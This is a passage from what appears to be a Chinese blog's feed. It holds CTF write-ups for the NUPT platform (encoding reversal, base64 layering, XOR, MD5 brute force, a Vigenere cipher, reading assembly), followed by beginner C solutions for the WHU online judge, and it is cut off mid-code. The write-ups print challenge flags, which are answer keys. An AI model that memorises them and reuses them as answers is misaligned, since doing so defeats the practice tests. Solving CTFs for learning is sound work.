class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">&gt;   $_o=strrev($str);</span><br><span class="line">&gt;   <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlrn($_o),$_0++)&#123;</span><br><span class="line">&gt;     $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">&gt;     $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">&gt;     $_c=chr($__);</span><br><span class="line">&gt;     $_=$_.$_c;</span><br><span class="line">&gt;   &#125;</span><br><span class="line">&gt;   <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">"iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $strtmp=base64_decode(strrev(str_rot13($str)));</span><br><span class="line">    $res=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($strtmp);$i++)&#123;</span><br><span class="line">        $res.=chr(ord(substr($strtmp, $i,<span class="number">1</span>))<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> strrev($res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> decode($s);</span><br></pre></td></tr></table></figure><p><em>nctf{rot13and_base64and_strrev}</em></p><h4 id="mixed-base64"><a href="#mixed-base64" class="headerlink" title="mixed base64"></a><a href="http://ctf.nuptsast.com/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt" target="_blank" rel="noopener">mixed base64</a></h4><blockquote><p>多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> random</span><br><span class="line">&gt; <span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">&gt; result=&#123;</span><br><span class="line">&gt;   <span class="string">'16'</span>:<span class="keyword">lambda</span> x:b16encode(x),</span><br><span class="line">&gt;   <span class="string">'32'</span>:<span class="keyword">lambda</span> x:b32encode(x),</span><br><span class="line">&gt;   <span class="string">'64'</span>:<span class="keyword">lambda</span> x:b64encode(x)</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; flag=<span class="string">b"&#123;nctf&#123;***&#125;"</span></span><br><span class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">&gt;   a=random.choice([<span class="string">'16'</span>,<span class="string">'32'</span>,<span class="string">'64'</span>])</span><br><span class="line">&gt;   flag=result[a](flag)</span><br><span class="line">&gt; <span class="keyword">with</span> open(<span class="string">"code.txt"</span>,<span class="string">'wb'</span>)<span class="keyword">as</span> f:</span><br><span class="line">&gt;   f.write(flag)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>解码代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b32decode, b16decode</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'code.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trys</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> [b64decode, b32decode, b16decode]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t = f(s)</span><br><span class="line">            <span class="keyword">if</span> t[:<span class="number">4</span>] == <span class="string">"nctf"</span>:</span><br><span class="line">                <span class="keyword">print</span> t</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                trys(t)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">trys(c)</span><br></pre></td></tr></table></figure><p><em>nctf{random_mixed_base64_encode}</em></p><h4 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a><a href="http://ctf.nuptsast.com/static/uploads/7ecc0dbd59f262e698b2dd94b39825bc/biubiubiu.zip" target="_blank" rel="noopener">异性相吸</a></h4><blockquote><p>同性真爱，异性相吸都是假的！<br>（题目要求，我是直的）</p><p>解密压缩文件里的内容</p><p>TIPS:<br>1.xor<br>2.hex2binary<br>3.len(bin(miwen))==len(bin(mingwen))</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=open(<span class="string">'密文.txt'</span>).read()</span><br><span class="line">p=open(<span class="string">'明文.txt'</span>).read()</span><br><span class="line">s=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line"> s+=chr(ord(c[i])^ord(p[i]))</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p><em>nctf{xor_xor_xor_biubiubiu}</em></p><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><blockquote><p>python大法好！<br>这里有一段丢失的md5密文<br>e9032???da???08????911513?0???a2<br>要求你还原出他并且加上nctf{}提交</p><p>已知线索 明文为： TASC?O3RJMV?WDJKX?ZM</p><p>题目来源：安恒杯</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">pool = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">s0 = <span class="string">'TASC?O3RJMV?WDJKX?ZM'</span></span><br><span class="line">ss = s0.split(<span class="string">'?'</span>)</span><br><span class="line">m = <span class="string">'e9032???da???08????911513?0???a2'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pool:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> pool:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> pool:</span><br><span class="line">            s = ss[<span class="number">0</span>] + i + ss[<span class="number">1</span>] + j + ss[<span class="number">2</span>] + k + ss[<span class="number">3</span>]</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest()[:<span class="number">5</span>] == m[:<span class="number">5</span>]:</span><br><span class="line">                <span class="keyword">print</span> s, hashlib.md5(s).hexdigest()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><em>nctf{e9032994dabac08080091151380478a2}</em></p><h4 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h4><blockquote><p>It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)</p><p>Tips:<br>1.The encode pragram is given;<br>2.Do u no <a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">index of coincidence </a>？<br>3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_LENGTH 2 <span class="comment">// Can be anything from 1 to 13</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *fpIn, *fpOut;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> key[KEY_LENGTH] = &#123;<span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  <span class="comment">/* of course, I did not use the all-0s key to encrypt */</span></span><br><span class="line"></span><br><span class="line">  fpIn = fopen(<span class="string">"ptext.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fpOut = fopen(<span class="string">"ctext.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line"></span><br><span class="line">  i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fpIn, <span class="string">"%c"</span>, &amp;ch) != EOF) &#123;</span><br><span class="line">    <span class="comment">/* avoid encrypting newline characters */</span>  </span><br><span class="line">    <span class="comment">/* In a "real-world" implementation of the Vigenere cipher, </span></span><br><span class="line"><span class="comment">       every ASCII character in the plaintext would be encrypted.</span></span><br><span class="line"><span class="comment">       However, I want to avoid encrypting newlines here because </span></span><br><span class="line"><span class="comment">       it makes recovering the plaintext slightly more difficult... */</span></span><br><span class="line">    <span class="comment">/* ...and my goal is not to create "production-quality" code =) */</span></span><br><span class="line">    <span class="keyword">if</span> (ch!=<span class="string">'\n'</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(fpOut, <span class="string">"%02X"</span>, ch ^ key[i % KEY_LENGTH]); <span class="comment">// ^ is logical XOR    </span></span><br><span class="line">      i++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fclose(fpIn);</span><br><span class="line">  fclose(fpOut);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt</span></span><br><span class="line"></span><br><span class="line">F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794</span><br></pre></td></tr></table></figure><p>详见 <a href="https://findneo.github.io/2017/10/nupt-vigenere/">南邮CTF平台 Vigenere writeup</a> 。</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="Hello-RE"><a href="#Hello-RE" class="headerlink" title="Hello,RE!"></a>Hello,RE!</h4><blockquote><p>或许你需要去学习下IDA的使用，但是只需要学一点点就能做这题了<br>PS:IDA里面按R可以把奇怪的数字变成字符串</p><p>格式为<code>flag{*****}</code>包含flag{}提交</p><p>参考资料：<br>《IDA Pro 权威指南》<br>各种CTF比赛的逆向部分的writeup</p><p><a href="1.zip">1.exe</a> </p></blockquote><p>拖进IDA，定位到main函数，按F5反编译。对着V5~V10逐个按R将十六进制转为字符串即可。<code>flag{Welcome_To_RE_World!}</code> </p><p><img src="1522647772019.png" alt="52264777201"></p><h4 id="ReadAsm2"><a href="#ReadAsm2" class="headerlink" title="ReadAsm2"></a>ReadAsm2</h4><blockquote><p>读汇编是逆向基本功。</p><p>给出的文件是func函数的汇编<br>main函数如下<br>输出的结果即为flag，格式为<code>flag{**********}</code>，请连flag{}一起提交</p><p>编译环境为linux gcc x86-64<br>调用约定为System V AMD64 ABI<br><strong>请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; int main(int argc, char const *argv[])</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;   char input[] = &#123;0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,</span><br><span class="line">&gt;                   0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,</span><br><span class="line">&gt;                   0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;;</span><br><span class="line">&gt;   func(input, 28);</span><br><span class="line">&gt;   printf(&quot;%s\n&quot;,input+1);</span><br><span class="line">&gt;   return 0;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>参考资料:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a><br>《汇编语言》王爽<br>《C 反汇编与逆向分析技术揭秘》</p><p><a href="2.asm">2.asm</a> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt; 00000000004004e6 &lt;func&gt;:</span><br><span class="line">&gt;   4004e6: 55                    push   rbp</span><br><span class="line">&gt;   4004e7: 48 89 e5              mov    rbp,rsp</span><br><span class="line">&gt;   4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line">&gt;   4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi</span><br><span class="line">&gt;   4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1</span><br><span class="line">&gt;   4004f8: eb 28                 jmp    400522 &lt;func+0x3c&gt;</span><br><span class="line">&gt;   4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">&gt;   4004fd: 48 63 d0              movsxd rdx,eax</span><br><span class="line">&gt;   400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">&gt;   400504: 48 01 d0              add    rax,rdx</span><br><span class="line">&gt;   400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">&gt;   40050a: 48 63 ca              movsxd rcx,edx</span><br><span class="line">&gt;   40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]</span><br><span class="line">&gt;   400511: 48 01 ca              add    rdx,rcx</span><br><span class="line">&gt;   400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]</span><br><span class="line">&gt;   400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">&gt;   40051a: 31 ca                 xor    edx,ecx</span><br><span class="line">&gt;   40051c: 88 10                 mov    BYTE PTR [rax],dl</span><br><span class="line">&gt;   40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1</span><br><span class="line">&gt;   400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">&gt;   400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]</span><br><span class="line">&gt;   400528: 7e d0                 jle    4004fa &lt;func+0x14&gt;</span><br><span class="line">&gt;   40052a: 90                    nop</span><br><span class="line">&gt;   40052b: 5d                    pop    rbp</span><br><span class="line">&gt;   40052c: c3                    ret</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>武汉大学C语言上机训练系统练习</title>
      <link href="/160820WHUOJStarter/"/>
      <url>/160820WHUOJStarter/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="http://acm.whu.edu.cn/starter/problem/list?volume=1" target="_blank" rel="noopener">WHU OJ </a>，已无法访问</p></blockquote><p><img src="whu_oj_doing.png" alt="doing"></p><p><img src="whu_oj_rank.png" alt="rank"></p><h3 id="1021乒乓球比赛"><a href="#1021乒乓球比赛" class="headerlink" title="1021乒乓球比赛"></a>1021乒乓球比赛</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> i,j,k;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="string">'X'</span>; i&lt;<span class="string">'X'</span>+<span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="string">'X'</span>; j&lt;<span class="string">'X'</span>+<span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(k=<span class="string">'X'</span>; k&lt;<span class="string">'X'</span>+<span class="number">3</span>; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j!=i&amp;&amp;k!=i&amp;&amp;k!=j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c %c\n%c %c\n%c %c\n"</span>,<span class="string">'A'</span>,i,<span class="string">'B'</span>,j,<span class="string">'C'</span>,k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="string">'X'</span>; i&lt;<span class="string">'X'</span>+<span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="string">'X'</span>; j&lt;<span class="string">'X'</span>+<span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(k=<span class="string">'X'</span>; k&lt;<span class="string">'X'</span>+<span class="number">3</span>; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j!=i&amp;&amp;k!=i&amp;&amp;k!=j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(i==<span class="string">'X'</span>||k==<span class="string">'X'</span>||k==<span class="string">'Z'</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"%c %c\n%c %c\n%c %c\n"</span>,<span class="string">'A'</span>,i,<span class="string">'B'</span>,j,<span class="string">'C'</span>,k);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1025计算时间"><a href="#1025计算时间" class="headerlink" title="1025计算时间"></a>1025计算时间</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">time_elapse</span><span class="params">(<span class="keyword">int</span> hour, <span class="keyword">int</span> minute, <span class="keyword">int</span> second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> hour*<span class="number">3600</span>+minute*<span class="number">60</span>+second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">char</span> t[<span class="number">9</span>],s[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">int</span> a,b,c,d,e,f;</span><br><span class="line">    <span class="keyword">int</span> s1,s2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(; n&gt;<span class="number">0</span>; n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(getchar()!=<span class="string">'\n'</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,t,s);</span><br><span class="line">        a=t[<span class="number">0</span>]*<span class="number">10</span>+t[<span class="number">1</span>]<span class="number">-528</span>;</span><br><span class="line">        b=t[<span class="number">3</span>]*<span class="number">10</span>+t[<span class="number">4</span>]<span class="number">-528</span>;</span><br><span class="line">        c=t[<span class="number">6</span>]*<span class="number">10</span>+t[<span class="number">7</span>]<span class="number">-528</span>;</span><br><span class="line">        d=s[<span class="number">0</span>]*<span class="number">10</span>+s[<span class="number">1</span>]<span class="number">-528</span>;</span><br><span class="line">        e=s[<span class="number">3</span>]*<span class="number">10</span>+s[<span class="number">4</span>]<span class="number">-528</span>;</span><br><span class="line">        f=s[<span class="number">6</span>]*<span class="number">10</span>+s[<span class="number">7</span>]<span class="number">-528</span>;</span><br><span class="line">        s1=time_elapse(a,b,c);</span><br><span class="line">        s2=time_elapse(d,e,f);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,s1,s2,(s1&gt;s2?s1-s2:s2-s1));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1026非递归斐波那契"><a href="#1026非递归斐波那契" class="headerlink" title="1026非递归斐波那契"></a>1026非递归斐波那契</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a=b=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        b=b+a;</span><br><span class="line">        a=b-a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(; n&gt;<span class="number">0</span>; n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,fibonacci(m));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">using namespace std;</span></span><br><span class="line"><span class="comment">int main()&#123;</span></span><br><span class="line"><span class="comment">    int n, i, f1, 